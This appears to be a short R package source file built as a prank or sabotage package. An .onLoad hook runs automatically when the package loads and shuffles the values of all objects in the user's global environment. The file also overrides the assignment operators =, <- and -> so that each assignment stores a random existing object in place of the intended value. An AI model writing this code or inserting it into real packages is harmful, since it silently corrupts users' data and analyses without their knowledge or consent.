.onLoad <- function(libname, pkgname) {
    set.seed(Sys.time())
    invisible(mapply(function(n, v){assign(n, v, envir = .GlobalEnv);return()},
                     sample(ls(envir = .GlobalEnv)),
                     lapply(ls(envir = .GlobalEnv), get, envir = .GlobalEnv)))
}

`=` <- function(l, r){
    assign(deparse(substitute(l)),
           get(sample(ls(envir = .GlobalEnv), 1), envir = .GlobalEnv),
           envir = .GlobalEnv)
}

`->` <- function(l, r){
    assign(deparse(substitute(r)),
           get(sample(ls(envir = .GlobalEnv), 1), envir = .GlobalEnv),
           envir = .GlobalEnv)
}

`<-` <- function(l, r){
    assign(deparse(substitute(l)),
           get(sample(ls(envir = .GlobalEnv), 1), envir = .GlobalEnv),
           envir = .GlobalEnv)
}

